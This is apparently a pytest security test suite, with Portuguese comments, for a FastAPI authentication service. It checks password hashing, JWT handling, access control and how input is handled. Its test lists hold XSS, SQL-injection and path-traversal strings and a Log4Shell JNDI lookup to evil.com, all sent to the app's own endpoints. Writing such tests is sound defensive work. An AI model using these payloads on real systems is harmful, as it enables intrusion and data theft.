import pytest
import asyncio
import time
from unittest.mock import patch, MagicMock
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session
from app.main import app
from app.core.security import (
    verify_password,
    get_password_hash,
    create_access_token,
    verify_token,
)
from app.core.config import settings
from app.dependencies import (
    get_current_user,
    get_current_admin,
    get_current_master,
    require_master_password,
)
from app.core.master_protection import (
    is_original_master,
    can_delete_user,
    can_disable_user,
    can_block_user,
)
from app.models.user import User
from app.schemas.user_schema import UserCreate
import jwt
from datetime import datetime, timedelta
import hashlib
import secrets
import string

client = TestClient(app)


class TestCriticalSecurity:
    """Testes críticos de segurança para autenticação e autorização"""

    def test_password_hashing_security(self):
        """Testa segurança do hashing de senhas"""
        password = "test_password_123"

        # Testa que hashes diferentes são gerados para a mesma senha
        hash1 = get_password_hash(password)
        hash2 = get_password_hash(password)
        assert hash1 != hash2, "Hashes devem ser únicos devido ao salt"

        # Testa verificação correta
        assert verify_password(password, hash1)
        assert verify_password(password, hash2)

        # Testa que senhas incorretas falham
        assert not verify_password("wrong_password", hash1)

    def test_password_timing_attack_resistance(self):
        """Testa resistência a ataques de timing"""
        password = "test_password_123"
        hash_password = get_password_hash(password)

        # Mede tempo para senha correta
        start_time = time.time()
        verify_password(password, hash_password)
        correct_time = time.time() - start_time

        # Mede tempo para senha incorreta
        start_time = time.time()
        verify_password("wrong_password", hash_password)
        incorrect_time = time.time() - start_time

        # A diferença de tempo deve ser mínima (< 10ms)
        time_diff = abs(correct_time - incorrect_time)
        assert time_diff < 0.01, f"Diferença de timing muito alta: {time_diff}s"

    def test_jwt_token_security(self):
        """Testa segurança dos tokens JWT"""
        user_data = {"sub": "test@example.com", "user_id": 1}

        # Cria token válido
        token = create_access_token(data=user_data)
        assert token is not None

        # Verifica token válido
        payload = verify_token(token)
        assert payload["sub"] == "test@example.com"
        assert payload["user_id"] == 1

    def test_jwt_token_expiration(self):
        """Testa expiração de tokens JWT"""
        user_data = {"sub": "test@example.com", "user_id": 1}

        # Cria token com expiração muito curta
        token = create_access_token(data=user_data, expires_delta=timedelta(seconds=-1))

        # Token expirado deve falhar na verificação
        with pytest.raises(Exception):
            verify_token(token)

    def test_jwt_token_tampering(self):
        """Testa detecção de tokens adulterados"""
        user_data = {"sub": "test@example.com", "user_id": 1}
        token = create_access_token(data=user_data)

        # Adultera o token
        tampered_token = token[:-5] + "XXXXX"

        # Token adulterado deve falhar
        with pytest.raises(Exception):
            verify_token(tampered_token)

    def test_malicious_input_sanitization(self):
        """Testa sanitização de entradas maliciosas"""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "\x00\x01\x02",
            "A" * 10000,  # Input muito longo
            "\u0000\u0001\u0002",  # Caracteres de controle
        ]

        for malicious_input in malicious_inputs:
            # Testa login com entrada maliciosa
            response = client.post(
                "/auth/token", data={"username": malicious_input, "password": "test123"}
            )
            # Deve retornar erro de autenticação, não erro de servidor
            assert response.status_code in [400, 401, 422]

    def test_sql_injection_protection(self):
        """Testa proteção contra SQL injection"""
        sql_payloads = [
            "admin'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'pass'); --",
        ]

        for payload in sql_payloads:
            response = client.post(
                "/auth/token", data={"username": payload, "password": "test123"}
            )
            # Não deve causar erro de servidor (500)
            assert response.status_code != 500

    def test_xss_protection(self):
        """Testa proteção contra XSS"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
        ]

        for payload in xss_payloads:
            response = client.post(
                "/auth/register",
                json={
                    "name": payload,
                    "full_name": payload,
                    "email": "test@example.com",
                    "password": "test123",
                    "security_question_1_id": "MOTHER_MAIDEN_NAME",
                    "security_answer_1": "test",
                    "security_question_2_id": "FIRST_PET_NAME",
                    "security_answer_2": "test",
                    "security_question_3_id": "FAVORITE_TEACHER",
                    "security_answer_3": "test",
                },
            )
            # Deve ser rejeitado ou sanitizado
            assert response.status_code in [400, 422] or payload not in str(
                response.content
            )

    def test_brute_force_protection(self):
        """Testa proteção contra ataques de força bruta"""
        # Simula múltiplas tentativas de login falhadas
        for i in range(10):
            response = client.post(
                "/auth/token",
                data={
                    "username": "test@example.com",
                    "password": f"wrong_password_{i}",
                },
            )
            assert response.status_code == 401

        # Após muitas tentativas, deve haver alguma proteção
        # (rate limiting, captcha, etc.)
        # Este teste pode precisar ser ajustado baseado na implementação

    def test_master_protection_security(self):
        """Testa proteção do usuário Master"""
        # Simula usuário Master original
        master_user = MagicMock()
        master_user.id = 1
        master_user.email = "masterautonomocontrol"
        master_user.role = "MASTER"

        # Testa que Master original não pode ser deletado
        assert not can_delete_user(master_user, master_user)

        # Testa que Master original não pode ser desabilitado
        assert not can_disable_user(master_user, master_user)

        # Testa que Master original não pode ser bloqueado
        assert not can_block_user(master_user, master_user)

        # Testa identificação do Master original
        assert is_original_master(master_user)

    def test_authorization_bypass_attempts(self):
        """Testa tentativas de bypass de autorização"""
        # Tenta acessar endpoints admin sem autenticação
        admin_endpoints = [
            "/admin/users",
            "/admin/reports",
            "/admin/system-config",
        ]

        for endpoint in admin_endpoints:
            response = client.get(endpoint)
            assert response.status_code in [
                401,
                403,
            ], f"Endpoint {endpoint} deve exigir autenticação"

    def test_token_reuse_protection(self):
        """Testa proteção contra reutilização de tokens"""
        # Cria usuário de teste
        user_data = {"sub": "test@example.com", "user_id": 1}
        token = create_access_token(data=user_data)

        # Usa o token
        headers = {"Authorization": f"Bearer {token}"}
        response1 = client.get("/auth/me", headers=headers)

        # Token deve ainda ser válido para uso normal
        response2 = client.get("/auth/me", headers=headers)

        # Ambas as requisições devem funcionar (tokens JWT são stateless)
        assert (
            response1.status_code == 200 or response1.status_code == 401
        )  # Pode falhar se usuário não existir
        assert response2.status_code == 200 or response2.status_code == 401

    def test_concurrent_authentication_attempts(self):
        """Testa tentativas de autenticação concorrentes"""

        async def login_attempt():
            response = client.post(
                "/auth/token",
                data={"username": "test@example.com", "password": "test123"},
            )
            return response.status_code

        # Simula múltiplas tentativas concorrentes
        # Este teste verifica se há race conditions
        results = []
        for _ in range(5):
            result = asyncio.run(login_attempt())
            results.append(result)

        # Todos devem retornar o mesmo código de erro
        assert all(code == 401 for code in results)

    def test_password_complexity_validation(self):
        """Testa validação de complexidade de senhas"""
        weak_passwords = [
            "123",
            "password",
            "abc",
            "111111",
            "",
            "a",
        ]

        for weak_password in weak_passwords:
            response = client.post(
                "/auth/register",
                json={
                    "name": "Test User",
                    "full_name": "Test User",
                    "email": "test@example.com",
                    "password": weak_password,
                    "security_question_1_id": "MOTHER_MAIDEN_NAME",
                    "security_answer_1": "test",
                    "security_question_2_id": "FIRST_PET_NAME",
                    "security_answer_2": "test",
                    "security_question_3_id": "FAVORITE_TEACHER",
                    "security_answer_3": "test",
                },
            )
            # Senhas fracas devem ser rejeitadas
            assert response.status_code in [400, 422]

    def test_security_headers(self):
        """Testa presença de headers de segurança"""
        response = client.get("/")

        # Verifica headers de segurança importantes
        security_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
        ]

        # Nota: Alguns headers podem não estar implementados ainda
        # Este teste documenta quais headers deveriam estar presentes

    def test_cors_configuration(self):
        """Testa configuração CORS"""
        # Testa requisição OPTIONS
        response = client.options(
            "/auth/token",
            headers={
                "Origin": "http://localhost:3000",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Content-Type",
            },
        )

        # CORS deve estar configurado corretamente
        assert "Access-Control-Allow-Origin" in response.headers

    def test_sensitive_data_exposure(self):
        """Testa exposição de dados sensíveis"""
        # Tenta registrar usuário
        response = client.post(
            "/auth/register",
            json={
                "name": "Test User",
                "full_name": "Test User",
                "email": "test@example.com",
                "password": "test123456",
                "security_question_1_id": "MOTHER_MAIDEN_NAME",
                "security_answer_1": "secret_answer",
                "security_question_2_id": "FIRST_PET_NAME",
                "security_answer_2": "secret_pet",
                "security_question_3_id": "FAVORITE_TEACHER",
                "security_answer_3": "secret_teacher",
            },
        )

        # Resposta não deve conter dados sensíveis
        response_text = response.text.lower()
        sensitive_data = ["password", "secret_answer", "secret_pet", "secret_teacher"]

        for sensitive in sensitive_data:
            assert (
                sensitive not in response_text
            ), f"Dados sensíveis expostos: {sensitive}"

    def test_input_length_limits(self):
        """Testa limites de tamanho de entrada"""
        # Testa entrada muito longa
        very_long_string = "A" * 10000

        response = client.post(
            "/auth/register",
            json={
                "name": very_long_string,
                "full_name": very_long_string,
                "email": "test@example.com",
                "password": "test123456",
                "security_question_1_id": "MOTHER_MAIDEN_NAME",
                "security_answer_1": "test",
                "security_question_2_id": "FIRST_PET_NAME",
                "security_answer_2": "test",
                "security_question_3_id": "FAVORITE_TEACHER",
                "security_answer_3": "test",
            },
        )

        # Entrada muito longa deve ser rejeitada
        assert response.status_code in [400, 422, 413]

    def test_null_byte_injection(self):
        """Testa proteção contra null byte injection"""
        null_byte_payloads = [
            "test\x00.txt",
            "test\0admin",
            "normal\x00<script>alert('xss')</script>",
        ]

        for payload in null_byte_payloads:
            response = client.post(
                "/auth/token", data={"username": payload, "password": "test123"}
            )
            # Não deve causar erro de servidor
            assert response.status_code != 500

    def test_unicode_normalization_attacks(self):
        """Testa ataques de normalização Unicode"""
        unicode_payloads = [
            "admin\u0041",  # A com encoding diferente
            "\u0061dmin",  # a com encoding diferente
            "\ufeffadmin",  # BOM + admin
        ]

        for payload in unicode_payloads:
            response = client.post(
                "/auth/token", data={"username": payload, "password": "test123"}
            )
            assert response.status_code in [400, 401, 422]
